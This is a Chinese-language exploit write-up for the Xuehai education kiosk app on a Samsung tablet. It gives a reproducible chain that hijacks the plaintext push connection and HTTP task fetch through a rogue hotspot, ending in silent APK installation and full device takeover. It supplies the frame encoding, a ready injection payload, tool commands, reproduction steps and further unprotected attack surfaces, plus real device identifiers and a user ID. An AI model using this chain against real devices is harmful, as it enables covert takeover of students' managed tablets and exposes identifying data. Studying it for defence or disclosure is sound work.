# 学海学生端 SM-P200 —— 全链路接管方案（代码级 + 实机验证）

> 目标：Samsung SM-P200（Android 9，教育 kiosk，MDM 全策略管控）
> 触发条件：**平板连上研究主机开的移动热点**，此后全程零人工、零交互
> 文档版本：2026-11-08
> 证据等级约定：`✅实测` = 抓包/回执/日志实测；`✅代码` = smali 级逐行确认；`⚠️待测` = 代码闭合但运行时尚未走通

---

## 0. 一句话链路

```
平板连上 PC 热点（网关=PC）
   └─> 平板向 47.99.85.219:3200 建立明文 TCP 长连接（学海自研推送 SDK）
        └─> PC 用 Npcap 用户态 TCP 应答器冒充该服务器，完成 AUTH 握手
             └─> 注入 cmd=0x03 MESSAGE 帧（msgType=assist-notify）
                  └─> 平板解析并回 MESSAGE_FB（已实测）
                       └─> LocalBroadcast → LauncherPushService.disposeMessage
                            └─> AssistModel.sendAssistMessage → AssistService(:assist 进程)
                                 └─> AssistService 主动 HTTP GET .../assists/{id}/tasks（明文 80）
                                      └─> 被 PC 的 http80 应答器接管，返回伪造任务
                                           └─> AssistFunc [ZAZE] 执行 installAppOnline(url)
                                                └─> DownloadManager → ApplicationPolicyProxy
                                                     └─> MdmPolicy → MdmService(AIDL) → Knox 静默安装
                                                          └─> 我们的 APK 落地 → 全设备接管
```

---

## 1. 链路逐环证据表

| # | 环节 | 关键代码 / 常量 | 状态 |
|---|---|---|---|
| L0 | PC 成为平板网关 | Windows 移动热点，`192.168.137.1`，需支持 AP 的 USB 无线网卡 | ✅实测（08:16 起稳定） |
| L1 | 平板入网 | 平板 `192.168.137.13`，MAC `80:20:fd:8b:4b:fa`，ping 通 | ✅实测 |
| L2 | 3200 明文推送连接被接管 | Npcap `\Device\NPF_{C77D3DC2-...}`，伪造 src=真云 IP，独立 seq 记账 | ✅实测（`est:8`，双向帧正常） |
| L3 | 注册帧解析 | `09 03 02 40 76 ...`：magic/ver/cmd=0x02/长度字节 + `accessKey, deviceId, clientId, signature, token, uid, tags` | ✅实测（解出 `uid=2112229`） |
| L4 | 下行 MESSAGE 帧构造 | `value=len+3`；`n=((len+3)>>6)` 字节；首字节 `((n&3)<<6)\|((value>>(8n))&0x3F)` | ✅实测（474/480/613/671B 帧全部被 ACK） |
| L5 | 平板解析 + 回执 | `PushClient.dealMessage` → `send(MessageFeedback)`（cmd=0x83） | ✅实测（平板回 `09 01 83 0e ...`，msgId 逐一对上） |
| L6 | 广播派发 | `dealMessage:614` → `PushActionHelper.onReceiverMessage` → `LocalBroadcastManager` | ✅代码（同进程，不会跨进程丢） |
| L7 | 消息路由 | `LauncherPushService.onReceiveMessageData$lambda-2:648-825`：userId 过滤 → `consume(appId==subAppId)` → `disposeMessage(subMsgType)` | ✅代码（uid 已在 L3 证明匹配） |
| L8 | assist-notify 分支 | `disposeMessage:559-578`（hashCode `-0x5b6b58d3`）→ `AssistModel.sendAssistMessage(payload)`，无任何门禁 | ✅代码 |
| L9 | 跨进程递送 | `AssistManager.sendAssistMessage:260` → `IpcHelper.sendAssistMessage`（`what=0x1e8481`, key `message_key`）→ `AssistService(:assist)` | ✅代码 |
| L10 | 协助启动 | `AssistService.assistNotify:451` → `"ENTRY"` → `startAssist():471` → `setStatus(1)` → `sendHeartMsg(true)` → `doAssist():516` → `requestAssistTask` | ✅代码 |
| L11 | 任务拉取（明文 HTTP） | `GET %s/api/v1/users/%s/devices/%s/assists/%s/tasks`，基址 `ms.yunzuoye.net` **端口 80 明文** | ✅代码 + 历史实测（2026-10-04 命中） |
| L12 | 伪造任务执行 | ZAZE 解释器 `ReflectUtil.executeMethod`，无白名单；`installAppOnline` / `executeCmd` / `downloadFile` 全部可调 | ✅代码 |
| L13 | 静默安装 11 环 | `AssistFunc.installAppOnline:999` → `DownloadManager` → `AssistFunc$installAppOnline$1.onSuccess:109` → `ApplicationPolicyProxy.installApplication:1586` → `PolicyManager.<clinit>:118-266`（`mdmEnable`=true）→ `MdmPolicy.invoke:29` → `MdmHolder.getMdmService:446` → `MdmServiceManager.bindService:109`（action `com.xuehai.system.mdm.action_aidl`）→ `MdmService`（`AndroidManifest:238-242` 存在） | ✅代码（11 环逐环确认） |
| L14 | 落地后全接管 | 广播 `com.xuehai.control.action.all_control`（动态注册、无权限）+ `content://com.xh.zhitongyun.provider/control`（`exported=true`、无权限校验） | ✅代码 |

---

## 2. 核心协议（可直接复现）

### 2.1 帧头

```
byte0 = 0x09 (MAGIC)
byte1 = version (客户端注册用 0x03，我们下行用 0x01，服务端不校验)
byte2 = cmd
byte3 = 长度首字节
```

长度编码（`PacketEncoder$Length` + `LengthByteBuf`）：

```
value = contentLen + 3
n = 0 (value < 64) / 1 (value < 16384) / 2 (value < 4194304)
byte3 = ((n & 3) << 6) | ((value >> (8*n)) & 0x3F)
其后 n 个字节 = value 的剩余大端字节
总帧长 = 4 + n + contentLen
```

校验实例：
- 平板注册帧 `09 03 02 40 76 ...` → n=1, value=0x4076=118 → body=115 → 总长 120 ✅
- 我们回的 AUTH_FB `09 01 82 33 ...` → n=0, value=0x33=51 → body=48 → 总长 52 ✅

### 2.2 命令字

| cmd | 含义 |
|---|---|
| 0x01 | HEART_BEAT |
| 0x02 | AUTHORIZATION |
| 0x03 | MESSAGE（下行消息） |
| 0x05 | PULL（客户端拉取离线消息） |
| 0x32 | ECHO |
| 0x82 | AUTHORIZATION_FB |
| 0x83 | MESSAGE_FB |
| 0x8B | ERROR_FB |

### 2.3 MESSAGE 内容

```
mode    : u8
count   : u16 BE
repeat count:
  msgId     : i64 BE
  contentLen: i32 BE     (0 <= len <= 0xA00000)
  content   : UTF-8 JSON
```

`content` = `PushMessage`（**全部字段为 String**，`style` 为 int）：

```json
{"appId":"zty_stu","subAppId":"zty_stu","clientId":"-","msgId":"1794097419002",
 "msgType":"assist-notify","subMsgType":"assist-notify",
 "payload":"{\"assistId\":\"assist_marvis_0001\",\"hidden\":1,\"operate\":\"ENTRY\",\"deviceId\":\"R52N9067SSF\",\"userId\":2112229}",
 "userId":"2112229","style":0}
```

要点：
- `appId` 必须等于 `subAppId`（`consume()` 只比较这两者）
- `userId` 必须等于 `String.valueOf(SessionData.getUserId())`，即注册帧里的 `uid`
- `assistId` 是 Gson 默认字段名（不是 `id`），错一个字母就静默丢弃
- `msgId` 必须全局唯一（`IDManager` 内存去重）

---

## 3. 当前唯一阻断点（诚实记录）

L5 之后的所有代码环节全部无门禁，但**实机运行到 L7 仍静默**：平板回了 MESSAGE_FB（证明 `dealMessage` 已执行、`send()` 返回 true），但 `assist-notify` / `app-notification` / `app-syncMessage` / `control-service` / `app-upgrade-prepare` 五类消息**全部无任何可观测后果**（无通知、无悬浮窗、无新 TCP 流、无 APK 下载）。

**唯一与现象自洽的解释**：`LauncherPushService` 未被注册。

代码依据（全包 grep，注册点唯一）：

```
XhApplication.smali:677-693
    if (CrashLevelManager.INSTANCE.isSeriousCrash()) {
        MyLog.i("[Lc]::", "当前处于崩溃状态，不执行该流程..");
        return-void;                      // ← doOnMainProcess() 被整体跳过
    }
XhApplication.smali:697
    doOnMainProcess();                    // ← 只有非崩溃才执行
```

`doOnMainProcess()` → `applicationLike.onCreateOnMainProcess()` → `ApplicationLikeMessage.onCreateOnMainProcess():340-357` 才 `LocalBroadcastManager.registerReceiver(new LauncherPushService(), ...)`。

`AppCrashManager`：`isSeriousCrash()` = `flag >= 3`；`levelUp()` 只在 `CrashReportHandler:275`；`clear()` 只在 `SafeViewModel$load$1$1:102`。

App 自带两段式自愈：

- 第 1 次启动：`WelcomeActivity.init():253-277` 命中崩溃 → 跳 `SafeActivity` → `SafeActivity:100-107` `postClear(5000)` → 清标志 → finish（**本次进程模块仍不初始化**）
- 第 2 次启动：标志已清零 → `onCreate` 正常 → 接收器注册 → 链路全通

**解锁动作：连续重启平板两次**（每次间隔到桌面即可）。

---

## 4. 备选链路（不依赖推送接收器）

### 4.1 Launcher 网络自检 WebView + LauncherJs 桥

`NetworkUtil.checkConnect():992` 加载明文 `http://www.zjxhedu.com/data/wifi.html`，并在 WebView 内挂载 `LauncherJs` 原生桥（页面可调 `LauncherJs.finish()` / `openCamera()` 等）。若能在平板加载该页面时接管 80 端口，即可在 launcher 进程内执行 JS 并调用原生桥——不依赖任何推送注册状态。

### 4.2 已装 APK 的零日链

`ControlReceiver`（`com.xuehai.control.action.all_control`，动态注册、无 permission）+ `content://com.xh.zhitongyun.provider/control`（`exported=true`，`MyContentProvider` 无权限校验）。需要先落地一个 APK——本链路的 L13 正是为它服务的安装通道。

---

## 5. 已证伪路径（不再重复投入）

| 路径 | 死因 | 代码证据 |
|---|---|---|
| Tinker 明文补丁 | 补丁签名比对 App 自身证书 | `ShareSecurityCheck.init` / `check()` |
| 443 中间人 | SAN 校验 | `XHHostnameVerifier` |
| 改线路配置 | 编译期 Production | `BuildConfig.ENV` |
| 3200 走「老格式 push_entry」 | 帧格式错，平板 RST | `PacketEncoder` / `Message.decode` |
| control 表当注入面 | `ControlDao.query` 是虚拟查询，内存实时计算，insert 不影响 query | `ControlDao:125-460` |
| wifimanager WebView JS 桥 | 该 APK 未注册 `addJavascriptInterface` | `wm_dec` 全包 grep |
| `getUserNeedInstallAppList` | 仅登录白名单清理 | `LoginViewModel:1740` |
| `executeCmd` 提权 | 走 `sh` 非 `su` | `ZCommand.execCmdForRes` |

---

## 6. 复现步骤

1. **网络**：PC 插入支持 AP 的 USB 无线网卡（RTL8811CU 已验证可用；内置 MT7922 无法开 AP），开「移动热点」，确认 `192.168.137.1` 出现。
2. **接管 3200**：`pythonw tools/np3200_push_inject.py 86400`（需管理员/Npcap）。
3. **接管 80**：`pythonw tools/npcap_http80.py 86400`（返回伪造 assist 会话与任务）。
4. **APK 分发**：`pythonw tools/apk_http_server.py`（8080，供 `installAppOnline` 回源）。
5. **一键重启全部**：`powershell -File tools/resume_all.ps1`（自动适配热点接口/平板 IP 并拉起全部组件）。
6. **触发**：平板连上热点后，3200 应答器在每次注册握手时自动注入 `assist-notify`。
7. **确认点**：`npcap_http80.log` 出现 `!!!!!! [ASSIST] device pulls tasks`，随后出现 `[APK]` 下载与安装回执。

---

## 7. 附：本次实机时间线（2026-11-08）

```
08:16:50  热点就绪 本地连接*4 / ifIndex 26 / 8c:81:2b:20:7b:42
08:17:03  3200 注册握手 → assist-notify 480B → ACK → 平板回 MESSAGE_FB
08:23:38  平板重启后首次注册 → 再次注入 → ACK → 回 MESSAGE_FB
08:23:49  二次重连 → 再次注入 → ACK → 回 MESSAGE_FB
08:23–08:29   http80 全程 syn:0（平板零 80 端口流量，assist 未点火）
```

*本文所有 smali 行号基于 `apktool` 反编译产物：`plat_dec`(com.xh.zhitongyunstu) / `launcher_dec`+`ztpt_new_dec`(com.xuehai.launcher) / `xhsettings_dec` / `wm_dec` / `cls_dec` / `tch_dec`。*
